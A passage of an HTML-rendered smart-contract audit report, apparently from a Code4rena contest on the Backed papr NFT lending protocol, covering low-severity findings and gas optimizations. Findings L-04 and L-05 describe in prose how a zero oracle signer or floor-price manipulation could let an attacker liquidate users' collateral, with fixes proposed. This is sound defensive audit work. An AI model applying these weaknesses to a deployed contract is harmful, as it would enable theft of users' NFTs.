id=\"l-03-using-the-30-days-twap-floor-price-of-the-entire-collection-means-that-the-protocol-is-largely-restricted-to-using-the-nfts-that-are-close-to-the-floor-price\" style=\"position:relative;\"><a href=\"#l-03-using-the-30-days-twap-floor-price-of-the-entire-collection-means-that-the-protocol-is-largely-restricted-to-using-the-nfts-that-are-close-to-the-floor-price\" aria-label=\"l 03 using the 30 days twap floor price of the entire collection means that the protocol is largely restricted to using the nfts that are close to the floor price permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] Using the 30 days TWAP floor price of the entire collection means that the protocol is largely restricted to using the NFTS that are close to the floor price.</h2>\n<p>There is currently a huge difference in price between the top few PUNK NFT, and the bottom few. For instance, the lowest ask price is currently <code>63.66 ETH</code> ( as of the time of writing this report ) as seen <a href=\"https://www.larvalabs.com/cryptopunks\">here</a>. The top few NFTS are last sold in the range of 1000s of ETH. </p>\n<p>Since the value of the debt that a user can raise from the collateral is computed by the total number of deposited collaterals multiplied by the lowest price of the NFT in the collection, it makes little sense for anyone to use any higher-valued NFTs as collateral. This seriously limits the use of the protocol if only a limited number of NFTS are used.</p>\n<h3 id=\"recommendation-2\" style=\"position:relative;\"><a href=\"#recommendation-2\" aria-label=\"recommendation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>It is recommended that we use a different metric to measure price here. We could target NFTs individually instead of seeing them as a group.</p>\n<h2 id=\"l-04-signature-scheme-is-not-checking-that-signeraddress-is-not-0\" style=\"position:relative;\"><a href=\"#l-04-signature-scheme-is-not-checking-that-signeraddress-is-not-0\" aria-label=\"l 04 signature scheme is not checking that signeraddress is not 0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Signature scheme is not checking that <code>signerAddress</code> is not 0</h2>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L88\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L88</a></p>\n<p><code>ecrecover</code> returns a value of 0 for invalid signature. We also note that in the constructor, there is no check to ensure that <code>oracleSigner</code> is not address 0.</p>\n<p>The only check for validity of signature is this,</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">signerAddress</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">oracleSigner</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IncorrectOracleSigner</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>If <code>oracleSigner</code> is set to <code>address(0)</code> then a malicious user can pass any price it wants into <code>oracleInfo</code> to bypass the check of signature used in <code>underwritePriceForCollateral()</code> and hence liquidate any collateral of any user, as well as being able to purchase this liquidated NFT at a price of 0.</p>\n<h3 id=\"recommendation-3\" style=\"position:relative;\"><a href=\"#recommendation-3\" aria-label=\"recommendation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>It is recommendated to add the check <code>if(signerAddress == address(0)) revert Error()</code>.</p>\n<h2 id=\"l-05-using-only-the-lowest-price-of-the-nft-of-the-entire-collection-can-be-dangerous\" style=\"position:relative;\"><a href=\"#l-05-using-only-the-lowest-price-of-the-nft-of-the-entire-collection-can-be-dangerous\" aria-label=\"l 05 using only the lowest price of the nft of the entire collection can be dangerous permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] Using only the lowest price of the NFT of the entire collection can be dangerous</h2>\n<p>Liquidation is decided based on the 30 days TWAP of the floor price of the collection. This might be manipulatable as we only have to manipulate a single NFT to drastically decrease the maximum debt that a user can hold since calculation is done by:</p>\n<blockquote>\n<p><code>Total number of NFTS * floor price</code></p>\n</blockquote>\n<p>An attacker can possibly control the price of a single NFT, and liquidate many users.</p>\n<h2 id=\"n-01-more-accurate-to-use--for-validity-of-oracle-timestamp\" style=\"position:relative;\"><a href=\"#n-01-more-accurate-to-use--for-validity-of-oracle-timestamp\" aria-label=\"n 01 more accurate to use  for validity of oracle timestamp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-01] More accurate to use <code>&#x3C;=</code> for validity of oracle timestamp</h2>\n<p><a href=\"https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L106\">https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/ReservoirOracleUnderwriter.sol#L106</a></p>\n<p>Currently, the check for oracle timestamp to not exceed <code>block.timestamp</code> is done with a strict comparison. Using <code>&#x3C;=</code> can be better here as <code>VALID_FOR</code> implies that the oracle timestamp would be valid for the entire duration.</p>\n<blockquote>\n<p><code>oracleInfo.message.timestamp + VALID_FOR &#x3C; block.timestamp</code></p>\n</blockquote>\n<h3 id=\"recommendation-4\" style=\"position:relative;\"><a href=\"#recommendation-4\" aria-label=\"recommendation 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Change to <code>oracleInfo.message.timestamp + VALID_FOR &#x3C;= block.timestamp</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/147#issuecomment-1410918068\">wilsoncusack (Backed) commented</a>:</strong></p>\n<blockquote>\n<p>I disagree with <code>L-02 - latestAuctionStartTime can be wrongly set to 0 even if an NFT is still selling in auction.</code></p>\n<p>The intent of latestAuctionStartTime is to ensure min spacing between any two auctions. If two auctions are running, that means that minSpacing time has passed. If minSpacing time has passed, then it is OK to reset latestAuctionStartTime after purchasing the latest auction to allow a 3rd auction to start.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 15 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/124\">report highlighted below</a> by <strong>IllIllI</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/274\">c3phas</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/273\">rjs</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/261\">0xSmartContract</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/253\">Aymen0909</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/250\">noot</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/213\">TomJ</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/184\">Mukund</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/161\">Awesome</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/100\">rbitbytes</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/77\">RaymondFam</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/58\">saneryee</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/13\">Rolezn</a>,\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/9\">eyexploit</a>, and\n<a href=\"https://github.com/code-423n4/2022-12-backed-findings/issues/4\">0xhacksmithh</a>\n.</em></p>\n<h2 id=\"gas-optimizations-summary\" style=\"position:relative;\"><a href=\"#gas-optimizations-summary\" aria-label=\"gas optimizations summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations Summary</h2>\n<table>\n<thead>\n<tr>\n<th></th>\n<th align=\"left\">Issue</th>\n<th align=\"center\">Instances</th>\n<th align=\"center\">Total Gas Saved</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>[G‑01]</td>\n<td align=\"left\">Avoid contract existence checks by using low level calls</td>\n<td align=\"center\">7</td>\n<td align=\"center\">700</td>\n</tr>\n<tr>\n<td>[G‑02]</td>\n<td align=\"left\"><code>internal</code> functions only called once can be inlined to save gas</td>\n<td align=\"center\">5</td>\n<td align=\"center\">100</td>\n</tr>\n<tr>\n<td>[G‑03]</td>\n<td align=\"left\">Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</td>\n<td align=\"center\">1</td>\n<td align=\"center\">85</td>\n</tr>\n<tr>\n<td>[G‑04]</td>\n<td align=\"left\"><code>keccak256()</code> should only need to be called on a specific string literal once</td>\n<td align=\"center\">2</td>\n<td align=\"center\">84</td>\n</tr>\n<tr>\n<td>[G‑05]</td>\n<td align=\"left\">Optimize names to save gas</td>\n<td align=\"center\">8</td>\n<td align=\"center\">176</td>\n</tr>\n<tr>\n<td>[G‑06]</td>\n<td align=\"left\">Use a more recent version of solidity</td>\n<td align=\"center\">10</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑07]</td>\n<td align=\"left\"><code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</td>\n<td align=\"center\">1</td>\n<td align=\"center\">5</td>\n</tr>\n<tr>\n<td>[G‑08]</td>\n<td align=\"left\">Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</td>\n<td align=\"center\">5</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑09]</td>\n<td align=\"left\">Using <code>private</code> rather than <code>public</code> for constants, saves gas</td>\n<td align=\"center\">2</td>\n<td align=\"center\">-</td>\n</tr>\n<tr>\n<td>[G‑10]</td>\n<td align=\"left\">Division by two should use bit shifting</td>\n<td align=\"center\">1</td>\n<td align=\"center\">20</td>\n</tr>\n<tr>\n<td>[G‑11]</td>\n<td align=\"left\">Functions guaranteed to revert when called by normal users can be marked <code>payable</code></td>\n<td align=\"center\">8</td>\n<td align=\"center\">168</td>\n</tr>\n</tbody>\n</table>\n<p>Total: 50 instances over 11 issues with <strong>1338 gas</strong> saved</p>\n<p>Gas totals use lower bounds of ranges and count two iterations of each <code>for</code>-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions. The table above as well as its gas numbers do not include any of the excluded findings.</p>\n<h2 id=\"g01--avoid-contract-existence-checks-by-using-low-level-calls\" style=\"position:relative;\"><a href=\"#g01--avoid-contract-existence-checks-by-using-low-level-calls\" aria-label=\"g01  avoid contract existence checks by using low level calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑01]  Avoid contract existence checks by using low level calls</h2>\n<p>Prior to 0.8.10 the compiler inserted extra code, including <code>EXTCODESIZE</code> (<strong>100 gas</strong>), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence.</p>\n<p><em>There are 7 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OracleLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit observe()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">59</span><span class=\"mtk1\">:           (</span><span class=\"mtk12\">int56</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tickCumulatives</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">observe</span><span class=\"mtk1\">(</span><span class=\"mtk12\">secondAgos</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L59\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/OracleLibrary.sol#L59</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">libraries</span><span class=\"mtk1\">/</span><span class=\"mtk12\">UniswapHelpers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit swap()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">40</span><span class=\"mtk1\">:           (</span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">int256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount1</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">swap</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit slot0()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">:           (, </span><span class=\"mtk12\">int24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tick</span><span class=\"mtk1\">,,,,,) = </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">slot0</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit token0()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit token0()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">93</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">return</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">token0</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">token0</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit token1()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit token1()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">94</span><span class=\"mtk1\">:               &amp;&amp; </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">token1</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">IUniswapV3Pool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">token1</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p><a href=\"https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L40\">https://github.com/with-backed/papr/blob/1933da2e38ff9d47c17e2749d6088bbbd40bfa68/src/libraries/UniswapHelpers.sol#L40</a></p>\n<h2 id=\"g02--internal-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#g02--internal-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"g02  internal functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑02]  <code>internal</code> functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs <strong>20 to 40 gas</strong> because of two extra <code>JUMP</code> instructions and additional stack operations needed for function calls.</p>\n<p><em>There are 5 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PaprController</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">424</span><span class=\"mtk1\">       </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_removeCollateral</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">425           </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sendTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">426           IPaprController.Collateral </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">427           </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oraclePrice</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">428:          </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">cachedTarget</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">493</span><span class=\"mtk1\">       </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_increaseDebtAndSell</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">494</span><span class=\"mtk1\">           </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">account</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">495</span><span class=\"mtk1\">           </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">proceedsTo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">496</span><span class=\"mtk1\">           </span><span class=\"mtk10\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk10\">collateralAsset</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">497</span><span class=\"mtk1\">           </span><span class=\"mtk10\">IPaprController</span><span class=\"mtk1\">.</span><span class=\"mtk10\">SwapParams</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">params</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">498</span><span class=\"mtk1\">           </span><span class=\"mtk10\">ReservoirOracleUnderwriter</span><span class=\"mtk1\">.</span><span class=\"mtk10\">OracleInfo</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">oracleInfo</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">499</span><span class=\"mtk1\">:      ) </span><span class=\"mtk10\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk10\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">amountOut</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">519</span><span class=\"mtk1\">       </span><span class=\"mtk10\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_purchaseNFTAndUpdateVaultIfNeeded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Auction</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction</span><span class=\"mtk1\">, </span><span 